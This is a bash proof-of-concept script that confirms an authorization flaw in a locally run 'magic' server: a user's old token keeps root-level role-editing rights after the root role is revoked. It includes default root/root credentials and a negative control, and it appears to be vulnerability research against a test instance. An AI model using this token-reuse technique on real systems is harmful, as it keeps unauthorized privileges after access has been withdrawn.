#!/usr/bin/env bash
set -u
B=http://localhost:4444

jget() { python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('ticket',''))" 2>/dev/null; }
auth() { curl -s -G "$B/magic/system/auth/authenticate" --data-urlencode "username=$1" --data-urlencode "password=$2" | jget; }
cpost() { curl -s -o /tmp/mc -w '%{http_code}' -X "$1" "$B$2" -H "Authorization: Bearer $3" -H 'Content-Type: application/json' -d "$4"; }
cdel()  { curl -s -o /tmp/mc -w '%{http_code}' -G -X DELETE "$B$2" -H "Authorization: Bearer $3" --data-urlencode "role=$4" --data-urlencode "user=$5"; }
body()  { head -c 90 /tmp/mc | tr '\n' ' '; }

echo "== 1 login root/root (pre-setup) =="
T0=$(auth root root); echo "  T0 len=${#T0}"
echo "== 2 setup (subscribe=false) =="
S=$(cpost POST /magic/system/config/setup "$T0" '{"username":"root","password":"RootSetup123","is_hashed":false,"name":"Root","email":"root@local.test","subscribe":false}')
echo "  setup=$S $(body)"; sleep 3
echo "== 3 login root/ADMINPASS =="
TA=$(auth root RootSetup123); echo "  TA len=${#TA}"
echo "== 4 create victim + plain =="
CV=$(cpost POST /magic/system/magic/users "$TA" '{"username":"victim","password":"VictimPass123"}'); echo "  victim=$CV $(body)"
CP=$(cpost POST /magic/system/magic/users "$TA" '{"username":"plain","password":"PlainPass123"}'); echo "  plain=$CP $(body)"
echo "== 5 grant root role to victim =="
CA=$(cpost POST /magic/system/magic/users_roles "$TA" '{"role":"root","user":"victim"}'); echo "  assign=$CA $(body)"
echo "== 6 create src_role (idempotent source target) =="
CS=$(cpost POST /magic/system/magic/roles "$TA" '{"name":"src_role","description":"init"}'); echo "  srcrole=$CS $(body)"

echo "== NEG CONTROL: plain (no role) PUT roles -> expect 403/401 =="
TP=$(auth plain PlainPass123)
C_NEG=$(cpost PUT /magic/system/magic/roles "$TP" '{"name":"src_role","description":"byplain"}'); echo "  plain PUT roles=$C_NEG $(body)"

echo "== A/B victim_old PUT roles (SOURCE, before demotion) -> expect 202 =="
TV=$(auth victim VictimPass123); echo "  TV_OLD len=${#TV}"
C_BEFORE=$(cpost PUT /magic/system/magic/roles "$TV" '{"name":"src_role","description":"before"}'); echo "  before=$C_BEFORE $(body)"
echo "== D TRANSITION admin removes victim root -> expect 200 affected:1 =="
C_TRANS=$(cdel DELETE /magic/system/magic/users_roles "$TA" root victim); echo "  transition=$C_TRANS $(body)"
echo "== E BUG victim_old SAME token PUT roles (after demotion) -> expect 202 =="
C_AFTER=$(cpost PUT /magic/system/magic/roles "$TV" '{"name":"src_role","description":"after"}'); echo "  after=$C_AFTER $(body)"
echo "== F D1 victim re-login new token PUT roles -> expect 403 =="
TVN=$(auth victim VictimPass123); echo "  TV_NEW len=${#TVN}"
C_NEW=$(cpost PUT /magic/system/magic/roles "$TVN" '{"name":"src_role","description":"newtok"}'); echo "  newtok=$C_NEW $(body)"

echo "== VERDICT =="
ok=1
[ "$C_BEFORE" = 202 ] || { echo "  X source before != 202 ($C_BEFORE)"; ok=0; }
[ "$C_TRANS" = 200 ]  || { echo "  X transition != 200 ($C_TRANS)"; ok=0; }
[ "$C_AFTER" = 202 ]  || { echo "  X old-token after != 202 ($C_AFTER)"; ok=0; }
[ "$C_NEW" = 403 ]    || { echo "  X new-token != 403 ($C_NEW)"; ok=0; }
[ "$C_NEG" = 401 ] || [ "$C_NEG" = 403 ] || { echo "  X neg-control not denied ($C_NEG)"; ok=0; }
if [ "$ok" = 1 ]; then
  echo "  PASS: MR-A1 confirmed on running magic $(git -C infra/magic-target/magic rev-parse --short HEAD 2>/dev/null)"
  echo "  old-token after demotion=$C_AFTER (ALLOWED) vs new-token=$C_NEW (DENIED) ; neg-control=$C_NEG"
  exit 0
else
  echo "  FAIL"; exit 1
fi
